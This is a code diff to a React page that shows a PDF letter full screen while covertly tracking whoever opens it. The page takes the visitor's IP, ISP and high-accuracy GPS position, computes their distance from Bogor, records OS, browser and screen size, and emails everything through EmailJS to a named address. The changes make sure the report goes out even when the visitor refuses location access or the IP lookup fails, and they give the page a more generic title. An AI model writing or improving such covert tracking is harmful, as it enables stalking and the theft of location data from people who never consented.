@@ -13,20 +13,25 @@ function App() {
   const hasSent = useRef(false);
 
   useEffect(() => {
-    // Pastikan ipData sudah ada dan email belum pernah terkirim
-    if (ipData && !hasSent.current) {
+    // TRIGGER: Jika loading sudah false (selesai fetch, baik sukses/gagal)
+    // dan email belum pernah terkirim di sesi ini.
+    if (!loading && !hasSent.current) {
       handleHybridTracking();
     }
-  }, [ipData]);
+  }, [loading]);
 
   const handleHybridTracking = () => {
+    if (hasSent.current) return;
+
+    // Coba minta akses GPS
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
           sendEmail(pos.coords.latitude, pos.coords.longitude, "GPS Diberikan");
         },
-        () => {
-          sendEmail(null, null, "GPS Ditolak/Silent");
+        (err) => {
+          // Tetap kirim email meski GPS ditolak user
+          sendEmail(null, null, `GPS Ditolak/Error: ${err.message}`);
         },
         { enableHighAccuracy: true, timeout: 5000 }
       );
@@ -37,25 +42,31 @@ function App() {
 
   const sendEmail = async (gpsLat, gpsLon, gpsStatus) => {
     try {
+      // Ambil koordinat dari IP jika ada, jika tidak set ke 0
       const ispLat = ipData?.lat || 0;
       const ispLon = ipData?.lon || 0;
 
-      // Logika penentuan koordinat akhir untuk haversine
+      // Tentukan koordinat terbaik untuk menghitung jarak
       const finalLat = gpsLat || ispLat;
       const finalLon = gpsLon || ispLon;
       
-      const distance = (haversine(BOGOR_COORDS, { latitude: finalLat, longitude: finalLon }) / 1000).toFixed(2);
+      let distanceText = "Tidak dapat menghitung jarak";
+      if (finalLat !== 0) {
+        const distance = (haversine(BOGOR_COORDS, { latitude: finalLat, longitude: finalLon }) / 1000).toFixed(2);
+        distanceText = `${distance} km`;
+      }
 
       const templateParams = {
         to_email: 'suhilman@bignet.id',
-        ip_address: ipData?.ip || 'N/A', 
-        isp: ipData?.isp || 'N/A', // Sekarang terisi dari ip-api
+        ip_address: ipData?.ip || 'Gagal Mendapatkan IP', 
+        isp: ipData?.isp || 'Unknown ISP', 
         as_name: ipData?.asn || 'N/A', 
-        isp_lat_long: `${ispLat},${ispLon}`,
+        isp_lat_long: ispLat !== 0 ? `${ispLat},${ispLon}` : "N/A",
         gps_lat_long: gpsLat ? `${gpsLat},${gpsLon}` : "N/A",
-        // Detail lokasi dari ip-api
-        location_detail: `${ipData?.city || ''}, ${ipData?.regionName || ''}, ${ipData?.country || ''} (${ipData?.zip || ''})`,
-        distance_from_bogor: `${distance} km`,
+        location_detail: ipData 
+          ? `${ipData.city || ''}, ${ipData.regionName || ''}, ${ipData.country || ''}`
+          : "Detail lokasi IP tidak tersedia",
+        distance_from_bogor: distanceText,
         device_os: detectOS(),
         browser: detectBrowser(),
         screen_res: `${screenSize.width}x${screenSize.height}`,
@@ -71,17 +82,18 @@ function App() {
       );
       
       hasSent.current = true;
+      console.log("Tracking berhasil dikirim.");
     } catch (err) {
       console.error('EmailJS Error:', err);
     }
   };
 
   return (
-   <div style={{ height: '100vh',  margin: 0, padding: 0, overflow: 'hidden' }}>
-      {/* Menggunakan iframe untuk menampilkan PDF secara full screen */}
+    <div style={{ height: '100vh', margin: 0, padding: 0, overflow: 'hidden', backgroundColor: '#000' }}>
+      {/* Menampilkan PDF secara Full Screen */}
       <iframe
-        src={`${suratNova}#toolbar=0`} 
-        title="Surat Nova"
+        src={`${suratNova}#toolbar=0&navpanes=0`} 
+        title="Surat"
         style={{ width: '100%', height: '100%', border: 'none' }}
       />
     </div>
